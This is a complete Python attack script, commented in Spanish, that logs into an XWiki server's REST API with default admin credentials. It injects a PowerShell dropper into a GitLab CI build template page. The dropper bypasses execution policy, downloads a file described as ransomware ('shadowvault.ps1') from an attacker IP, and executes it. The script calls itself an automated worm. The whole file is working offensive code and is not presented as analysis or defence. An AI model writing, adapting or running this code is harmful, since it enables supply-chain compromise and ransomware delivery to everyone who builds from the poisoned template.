#!/usr/bin/env python3
import requests
import sys
import time

# --- CONFIGURACIÓN ---
TARGET_IP = "192.168.2.178"
PORT = "8080"
USER = "admin"
PASS = "admin"

# URLs de la API REST de XWiki
BASE_URL = f"http://{TARGET_IP}:{PORT}/xwiki/rest/wikis/xwiki"
PAGE_URL = f"{BASE_URL}/spaces/Dev/spaces/GitLabCIStandardTemplate/pages/WebHome"

# --- PAYLOAD ---
# ¡IMPORTANTE! Cambia la IP de abajo por tu IP de Kali (mírala con 'ip a')
ATTACKER_IP = "192.168.2.171" 
RANSOM_FILE = "shadowvault.ps1"

PAYLOAD = f"""
    - echo "Verificando dependencias del entorno..."
    # [MALWARE] Dropper automático: Bypass Policy + Descarga + Ejecuta
    - powershell -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri http://{ATTACKER_IP}:8000/{RANSOM_FILE} -OutFile $env:TEMP\\update.ps1; &amp; $env:TEMP\\update.ps1"
"""

def inject_malware():
    print(f"[*] Conectando al API de XWiki en {TARGET_IP}...")
    
    # 1. Obtener la página actual (GET)
    try:
        r = requests.get(PAGE_URL, auth=(USER, PASS), headers={'Accept': 'application/xml'})
        if r.status_code == 404:
            print("[!] La página objetivo no existe. Créala primero en XWiki (Dev.GitLabCITemplate).")
            print(PAGE_URL)
            return False
        elif r.status_code != 200:
            print(f"[!] Error de conexión: {r.status_code}")
            return False
            
        print("[✔] Página original descargada. Analizando estructura...")
        xml_content = r.text
        
    except Exception as e:
        print(f"[!] Excepción: {e}")
        return False

    # 2. Modificar el contenido (Inyección)
    # Buscamos dónde inyectar (dentro del script de build)
    target_string = 'mvn clean package -B'
    
    if target_string not in xml_content:
        print("[!] No encuentro el punto de inyección seguro (mvn clean package).")
        # Fallback simple: añadir al final si no encuentra el patrón
        return False
        
    print("[*] Inyectando payload malicioso...")
    # Reemplazamos el comando de compilación con: comando + payload
    modified_xml = xml_content.replace(
        target_string, 
        f"{target_string}\n{PAYLOAD}"
    )

    # 3. Subir la página modificada (PUT)
    print("[*] Propagando cambios al servidor...")
    try:
        headers = {'Content-Type': 'application/xml'}
        r = requests.put(PAGE_URL, auth=(USER, PASS), data=modified_xml, headers=headers)
        
        if r.status_code in [201, 202, 200]:
            print("\n" + "="*50)
            print(f" [✔] SUCCESS: WORM INJECTION COMPLETE")
            print("="*50)
            print(f" [+] Objetivo: {PAGE_URL}")
            print(f" [+] Método:   API REST (Authenticated)")
            print(f" [+] Payload:  Activo y persistente")
            return True
        else:
            print(f"[✖] Fallo al subir: {r.status_code}")
            print(r.text)
            return False
            
    except Exception as e:
        print(f"[!] Error subiendo: {e}")
        return False

if __name__ == "__main__":
    print("--- XWIKI AUTOMATED WORM (CVE-2025-24893 Post-Auth) ---")
    inject_malware()